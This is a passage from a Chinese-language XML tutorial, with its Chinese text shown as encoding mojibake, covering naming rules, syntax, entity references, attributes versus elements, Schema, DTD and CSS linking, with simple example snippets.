è‹¥å­˜ä¸­æ–‡ï¼Œç”¨gbk</li><li>standaloneï¼šæ˜¯å¦ç‹¬ç«‹<ul><li>å–å€¼ï¼š<br>* yesï¼šä¸ä¾èµ–å…¶ä»–æ–‡ä»¶<ul><li>noï¼šä¾èµ–å…¶ä»–æ–‡ä»¶</li></ul></li></ul></li></ul><ol start="2"><li>æŒ‡ä»¤(äº†è§£)ï¼šç»“åˆcssçš„w<ul><li><?xml-stylesheet type="text/css" href="a.css" ?> (ç»™å½“å‰xmlåŠ æ ·å¼)</li></ul></li><li>æ ‡ç­¾ï¼šæ ‡ç­¾åç§°è‡ªå®šä¹‰çš„<br>* è§„åˆ™ï¼š<br>              * åç§°å¯ä»¥åŒ…å«å­—æ¯ã€æ•°å­—ä»¥åŠå…¶ä»–çš„å­—ç¬¦<br>* åç§°ä¸èƒ½ä»¥æ•°å­—æˆ–è€…æ ‡ç‚¹ç¬¦å·å¼€å§‹<br>* åç§°ä¸èƒ½ä»¥å­—æ¯ xmlï¼ˆæˆ–è€… XMLã€Xml ç­‰ç­‰ï¼‰å¼€å§‹<br>* åç§°ä¸èƒ½åŒ…å«ç©ºæ ¼ </li><li>å±æ€§ï¼š<br>idå±æ€§å€¼å”¯ä¸€</li><li>æ–‡æœ¬ï¼š<br>* CDATAåŒºï¼šåœ¨è¯¥åŒºåŸŸä¸­çš„æ•°æ®ä¼šè¢«åŸæ ·å±•ç¤º<br>        * æ ¼å¼ï¼š  <![CDATA[ æ•°æ® ]]> ï¼ˆåŸæ ·å±•ç¤ºä¹Ÿå°±æ„å‘³ç€ä¸ç”¨å®ä½“ä»£æ›¿ç‰¹æ®Šå­—ç¬¦ï¼‰</li></ol></blockquote><h3 id="XML-æ–‡æ¡£å½¢æˆä¸€ç§æ ‘ç»“æ„"><a href="#XML-æ–‡æ¡£å½¢æˆä¸€ç§æ ‘ç»“æ„" class="headerlink" title="XML æ–‡æ¡£å½¢æˆä¸€ç§æ ‘ç»“æ„"></a>XML æ–‡æ¡£å½¢æˆä¸€ç§æ ‘ç»“æ„</h3><p>XML æ–‡æ¡£å¿…é¡»åŒ…å«<em>æ ¹å…ƒç´ </em>ã€‚è¯¥å…ƒç´ æ˜¯æ‰€æœ‰å…¶ä»–å…ƒç´ çš„çˆ¶å…ƒç´ ã€‚</p><p>XML æ–‡æ¡£ä¸­çš„å…ƒç´ å½¢æˆäº†ä¸€æ£µæ–‡æ¡£æ ‘ã€‚è¿™æ£µæ ‘ä»æ ¹éƒ¨å¼€å§‹ï¼Œå¹¶æ‰©å±•åˆ°æ ‘çš„æœ€åº•ç«¯ã€‚</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>æ‰€æœ‰å…ƒç´ éƒ½å¯ä»¥æœ‰å­å…ƒç´ </p></blockquote><h2 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h2><h3 id="å¤§å°å†™æ•æ„Ÿ"><a href="#å¤§å°å†™æ•æ„Ÿ" class="headerlink" title="å¤§å°å†™æ•æ„Ÿ"></a>å¤§å°å†™æ•æ„Ÿ</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Message</span>&gt;</span>è¿™æ˜¯é”™è¯¯çš„ã€‚<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>è¿™æ˜¯æ­£ç¡®çš„ã€‚<span class="tag">&lt;/<span class="name">message</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><h3 id="æ­£ç¡®åµŒå¥—"><a href="#æ­£ç¡®åµŒå¥—" class="headerlink" title="æ­£ç¡®åµŒå¥—"></a>æ­£ç¡®åµŒå¥—</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>é”™è¯¯<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>æ­£ç¡®<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´ ï¼ˆå­å…ƒç´ é—´å¯ä»¥å¹¶åˆ—ï¼‰"><a href="#å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´ ï¼ˆå­å…ƒç´ é—´å¯ä»¥å¹¶åˆ—ï¼‰" class="headerlink" title="å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´ ï¼ˆå­å…ƒç´ é—´å¯ä»¥å¹¶åˆ—ï¼‰"></a>å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´ ï¼ˆå­å…ƒç´ é—´å¯ä»¥å¹¶åˆ—ï¼‰</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span> <span class="attr">category</span>=<span class="string">&quot;WEB&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="å±æ€§å€¼è¦åŠ å¼•å·"><a href="#å±æ€§å€¼è¦åŠ å¼•å·" class="headerlink" title="å±æ€§å€¼è¦åŠ å¼•å·"></a>å±æ€§å€¼è¦åŠ å¼•å·</h3><p>å•åŒéƒ½å¯ä»¥</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">date</span>=<span class="string">&quot;08/08/2008&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><h3 id="å®ä½“å¼•ç”¨"><a href="#å®ä½“å¼•ç”¨" class="headerlink" title="å®ä½“å¼•ç”¨"></a>å®ä½“å¼•ç”¨</h3><p>ç‰¹æ®Šç¬¦å·è½¬ä¹‰</p><table><thead><tr><th><code>&amp;lt;</code></th><th>&lt;</th><th>å°äº</th></tr></thead><tbody><tr><td><code>&amp;gt;</code></td><td>&gt;</td><td>å¤§äº</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td><td>å’Œå·</td></tr><tr><td><code>&amp;apos;</code></td><td>â€˜</td><td>å•å¼•å·</td></tr><tr><td><code>&amp;quot;</code></td><td>â€œ</td><td>å¼•å·</td></tr></tbody></table><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary &lt; 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary <span class="symbol">&amp;lt;</span> 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span>  âœ…</span><br></pre></td></tr></table></figure></div><blockquote><p>åœ¨ XML ä¸­ï¼Œåªæœ‰å­—ç¬¦ â€œ&lt;â€ å’Œ â€œ&amp;â€ ç¡®å®æ˜¯éæ³•çš„ã€‚å¤§äºå·æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯ç”¨å®ä½“å¼•ç”¨æ¥ä»£æ›¿å®ƒæ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚</p></blockquote><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p>ä½¿ç”¨<code>&lt;!--</code>ä¸<code>--&gt;</code> (éƒ½æ˜¯ä¸¤ä¸ªçŸ­æ¨ªæ )</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- This is a comment --&gt;</span>  </span><br></pre></td></tr></table></figure></div><h3 id="ä¿ç•™ç©ºæ ¼"><a href="#ä¿ç•™ç©ºæ ¼" class="headerlink" title="ä¿ç•™ç©ºæ ¼"></a>ä¿ç•™ç©ºæ ¼</h3><p>åœ¨ XML ä¸­ï¼Œæ–‡æ¡£ä¸­çš„ç©ºæ ¼ä¸ä¼šè¢«åˆ èŠ‚ã€‚</p><blockquote><p>HTML ä¼šæŠŠå¤šä¸ªè¿ç»­çš„ç©ºæ ¼å­—ç¬¦è£å‡ï¼ˆåˆå¹¶ï¼‰ä¸ºä¸€ä¸ªï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTML:Hello           my name is David.</span><br><span class="line">è¾“å‡º:Hello my name is David.</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="LFå­˜å‚¨æ¢è¡Œ"><a href="#LFå­˜å‚¨æ¢è¡Œ" class="headerlink" title="LFå­˜å‚¨æ¢è¡Œ"></a>LFå­˜å‚¨æ¢è¡Œ</h3><p>åœ¨ Windows åº”ç”¨ç¨‹åºä¸­ï¼Œæ¢è¡Œé€šå¸¸ä»¥ä¸€å¯¹å­—ç¬¦æ¥å­˜å‚¨ï¼šå›è½¦ç¬¦ (CR) å’Œæ¢è¡Œç¬¦ (LF)ã€‚è¿™å¯¹å­—ç¬¦ä¸æ‰“å­—æœºè®¾ç½®æ–°è¡Œçš„åŠ¨ä½œæœ‰ç›¸ä¼¼ä¹‹å¤„ã€‚åœ¨ Unix åº”ç”¨ç¨‹åºä¸­ï¼Œæ–°è¡Œä»¥ LF å­—ç¬¦å­˜å‚¨ã€‚è€Œ Macintosh åº”ç”¨ç¨‹åºä½¿ç”¨ CR æ¥å­˜å‚¨æ–°è¡Œã€‚</p><h2 id="å…ƒç´ "><a href="#å…ƒç´ " class="headerlink" title="å…ƒç´ "></a>å…ƒç´ </h2><p><strong>XML å…ƒç´ </strong>æŒ‡çš„æ˜¯ä»ï¼ˆä¸”åŒ…æ‹¬ï¼‰å¼€å§‹æ ‡ç­¾ç›´åˆ°ï¼ˆä¸”åŒ…æ‹¬ï¼‰ç»“æŸæ ‡ç­¾çš„éƒ¨åˆ†ã€‚</p><h3 id="å‘½åè§„åˆ™"><a href="#å‘½åè§„åˆ™" class="headerlink" title="å‘½åè§„åˆ™"></a>å‘½åè§„åˆ™</h3><ul><li>åç§°å¯ä»¥å«å­—æ¯ã€æ•°å­—ä»¥åŠå…¶ä»–çš„å­—ç¬¦</li><li>åç§°ä¸èƒ½ä»¥æ•°å­—æˆ–è€…æ ‡ç‚¹ç¬¦å·å¼€å§‹ </li><li>åç§°ä¸èƒ½ä»¥å­—ç¬¦ â€œxmlâ€ï¼ˆæˆ–è€… XMLã€Xmlï¼‰å¼€å§‹ </li><li>åç§°ä¸èƒ½åŒ…å«ç©ºæ ¼</li><li>å¯ä½¿ç”¨ä»»ä½•åç§°ï¼Œæ²¡æœ‰ä¿ç•™çš„å­—è¯</li></ul><blockquote><p>é¿å… â€œ-â€œ å­—ç¬¦ã€‚å¦‚æœæ‚¨æŒ‰ç…§è¿™æ ·çš„æ–¹å¼è¿›è¡Œå‘½åï¼šâ€first-nameâ€ï¼Œä¸€äº›è½¯ä»¶ä¼šè®¤ä¸ºä½ éœ€è¦æå–ç¬¬ä¸€ä¸ªå•è¯ã€‚</p><p>é¿å… â€œ.â€ å­—ç¬¦ã€‚å¦‚æœæ‚¨æŒ‰ç…§è¿™æ ·çš„æ–¹å¼è¿›è¡Œå‘½åï¼šâ€first.nameâ€ï¼Œä¸€äº›è½¯ä»¶ä¼šè®¤ä¸º â€œnameâ€ æ˜¯å¯¹è±¡ â€œfirstâ€ çš„å±æ€§ã€‚</p><p>é¿å… â€œ:â€ å­—ç¬¦ã€‚å†’å·ä¼šè¢«è½¬æ¢ä¸ºå‘½åç©ºé—´æ¥ä½¿ç”¨ã€‚</p><p>XML æ–‡æ¡£ç»å¸¸æœ‰ä¸€ä¸ªå¯¹åº”çš„æ•°æ®åº“ï¼Œå…¶ä¸­çš„å­—æ®µä¼šå¯¹åº” XML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚æœ‰ä¸€ä¸ªå®ç”¨çš„ç»éªŒï¼Œå³ä½¿ç”¨æ•°æ®åº“çš„åç§°è§„åˆ™æ¥å‘½å XML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚</p></blockquote><h2 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h2><p><strong>å±æ€§ (Attribute) æä¾›å…³äºå…ƒç´ çš„é¢å¤–ï¼ˆé™„åŠ ï¼‰ä¿¡æ¯ã€‚</strong></p><p>å±æ€§å€¼å¿…é¡»è¢«å¼•å·åŒ…å›´ï¼Œä¸è¿‡å•å¼•å·å’ŒåŒå¼•å·å‡å¯ä½¿ç”¨ã€‚æ¯”å¦‚ä¸€ä¸ªäººçš„æ€§åˆ«ï¼Œperson æ ‡ç­¾å¯ä»¥è¿™æ ·å†™ï¼š</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&#x27;female&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>å¦‚æœå±æ€§å€¼æœ¬èº«åŒ…å«åŒå¼•å·ï¼Œé‚£ä¹ˆæœ‰å¿…è¦ä½¿ç”¨å•å¼•å·åŒ…å›´å®ƒï¼Œå°±åƒè¿™ä¸ªä¾‹å­ï¼š</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">gangster</span> <span class="attr">name</span>=<span class="string">&#x27;George &quot;Shotgun&quot; Ziegler&#x27;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--æˆ–è€…ä½¿ç”¨å®ä½“å¼•ç”¨--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">gangster</span> <span class="attr">name</span>=<span class="string">&quot;George <span class="symbol">&amp;quot;</span>Shotgun<span class="symbol">&amp;quot;</span> Ziegler&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>å±æ€§ä¸å…ƒç´ çš„ä½¿ç”¨æ²¡æœ‰è§„å®šï¼Œå¯ä»¥æŒ‰ç…§è‡ªå·±å–œæ¬¢çš„æ–¹å¼</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">sex</span>&gt;</span>female<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><blockquote><p>å› ä½¿ç”¨å±æ€§è€Œå¼•èµ·çš„ä¸€äº›é—®é¢˜ï¼š</p><ul><li>å±æ€§æ— æ³•åŒ…å«å¤šé‡çš„å€¼ï¼ˆå…ƒç´ å¯ä»¥ï¼‰</li><li>å±æ€§æ— æ³•æè¿°æ ‘ç»“æ„ï¼ˆå…ƒç´ å¯ä»¥ï¼‰</li><li>å±æ€§ä¸æ˜“æ‰©å±•ï¼ˆä¸ºæœªæ¥çš„å˜åŒ–ï¼‰</li><li>å±æ€§éš¾ä»¥é˜…è¯»å’Œç»´æŠ¤</li></ul></blockquote><p><strong>å…ƒæ•°æ®ï¼ˆæœ‰å…³æ•°æ®çš„æ•°æ®ï¼‰åº”å½“å­˜å‚¨ä¸ºå±æ€§ï¼Œè€Œæ•°æ®æœ¬èº«åº”å½“å­˜å‚¨ä¸ºå…ƒç´ </strong></p><p>æœ‰æ—¶å€™ä¼šå‘å…ƒç´ åˆ†é… ID å¼•ç”¨ã€‚è¿™äº› ID ç´¢å¼•å¯ç”¨äºæ ‡è¯† XML å…ƒç´ ï¼Œå®ƒèµ·ä½œç”¨çš„æ–¹å¼ä¸ HTML ä¸­ ID å±æ€§æ˜¯ä¸€æ ·çš„</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">messages</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;501&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;502&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>John<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>George<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Re: Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>I will not<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">messages</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="XMLéªŒè¯"><a href="#XMLéªŒè¯" class="headerlink" title="XMLéªŒè¯"></a>XMLéªŒè¯</h2><p>æ‹¥æœ‰æ­£ç¡®è¯­æ³•çš„ XML è¢«ç§°ä¸ºâ€œå½¢å¼è‰¯å¥½â€çš„ XMLã€‚</p><p>é€šè¿‡ DTD éªŒè¯çš„ XML æ˜¯â€œåˆæ³•â€çš„ XMLã€‚</p><h3 id="XML-Schema"><a href="#XML-Schema" class="headerlink" title="XML Schema"></a>XML Schema</h3><p>W3C æ”¯æŒä¸€ç§åŸºäº XML çš„ DTD ä»£æ›¿è€…ï¼Œå®ƒåä¸º XML Schemaï¼š</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;note&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span>      <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;from&quot;</span>    <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;heading&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span>    <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:element</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><h3 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h3><p>DTD çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„ç»“æ„ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£ç»“æ„ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note [ &lt;!--DOCTYPE å£°æ˜æ˜¯å¯¹å¤–éƒ¨ DTD æ–‡ä»¶çš„å¼•ç”¨--&gt;</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure></div><h2 id="XML-CSS"><a href="#XML-CSS" class="headerlink" title="XML CSS"></a>XML CSS</h2><p>XMLå¯ä»¥è¿æ¥åˆ°CSSæ–‡ä»¶å¹¶è¢«å…¶æ ¼å¼åŒ–ï¼Œå‘ˆç°åœ¨ç½‘é¡µä¸Š </p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;cd_catalog.css&quot;</span>?&gt;</span> <span class="comment">&lt;!--æŠŠè¿™ä¸ªXMLæ–‡ä»¶é“¾æ¥åˆ°CSSæ–‡ä»¶--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">CATALOG</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">CD</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Empire Burlesque<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Bob Dylan<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>Columbia<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PRICE</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">PRICE</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1985<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">CD</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">CD</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Hide your heart<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ARTIST</span>&gt;</span>Bonnie Tyler<span class="tag">&lt;/<span class="name">ARTIST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">COUNTRY</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">COUNTRY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">COMPANY</span>&gt;</span>CBS Records<span class="tag">&lt;/<span class="name">COMPANY</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PRICE</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">PRICE</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">YEAR</span>&gt;</span>1988<span class="tag">&lt;/<span class="name">YEAR</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">CD</span>&gt;</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span 